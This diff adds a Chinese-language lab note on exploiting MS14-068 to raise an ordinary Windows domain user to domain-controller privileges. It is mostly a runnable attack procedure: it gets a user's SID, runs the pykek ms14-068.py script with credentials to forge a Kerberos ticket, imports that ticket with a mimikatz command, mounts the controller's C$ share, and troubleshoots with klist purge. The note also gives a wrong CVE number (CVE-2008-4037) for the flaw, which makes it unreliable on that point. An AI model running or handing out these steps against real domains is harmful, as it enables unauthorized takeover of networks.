@@ -1,0 +1,74 @@
+﻿教程
+https://github.com/demonxian3/windows-kernel-exploits/tree/master/MS14-068
+
+域搭建
+https://jingyan.baidu.com/article/1e5468f900946e484861b77d.html
+
+利用代码
+https://github.com/bidord/pykek
+
+资料网址
+http://www.freebuf.com/vuls/56081.html
+
+
+说明：
+普通域用户 提权到 域控权限
+
+
+漏洞号：
+MS14-068
+CVE-2008-4037
+
+
+准备：
+攻击者1： win7 
+攻击者2:  kali
+目标机：  win2003	2k3.lab.com
+
+
+
+操作：
+用普通用户cat登录处于域控内win7，whoami /all  普通域用户的获取SID
+
+用户名  SID
+======= =============================================
+lab\cat S-1-5-21-1966033738-903473644-2899968941-1115
+
+
+将kali设置与域同网段，DNS为域控服务器执行命令
+python ms14-068.py -u cat@lab.com -pYourPassword -d lab.com -s S-1-5-21-1966033738-903473644-2899968941-1115
+
+生成黄金票据
+  [+] Building AS-REQ for lab.com... Done!
+  [+] Sending AS-REQ to lab.com... Done!
+  [+] Receiving AS-REP from lab.com... Done!
+  [+] Parsing AS-REP from lab.com... Done!
+  [+] Building TGS-REQ for lab.com... Done!
+  [+] Sending TGS-REQ to lab.com... Done!
+  [+] Receiving TGS-REP from lab.com... Done!
+  [+] Parsing TGS-REP from lab.com... Done!
+  [+] Creating ccache file 'TGT_cat@lab.com.ccache'... Done!
+
+
+将票据拷贝到win7，用mimikatz导入票据
+
+mimikatz.exe "Kerberos::ptc C:\Users\cat\Desktop\TGT_cat@lab.com.ccache" exit
+
+net use k: \\2k3.lab.com\c$
+
+
+遇到的问题
+
+1.导入票据 net use 连接依然需要密码
+
+原因： 连接时依然使用旧的普通票据，需要清除所有票据重新导入
+
+klist		查看所有票据
+klist purge 	清除所有票据
+
+
+说明：sid只能通过登录域用户来查询 whoami /user，拿到sid后转回本地用户 test
+
+再用mimikatz导入票据，然后就提权成功，如果不能使用本地用户，只有普通域用户
+
+方面参考问题1
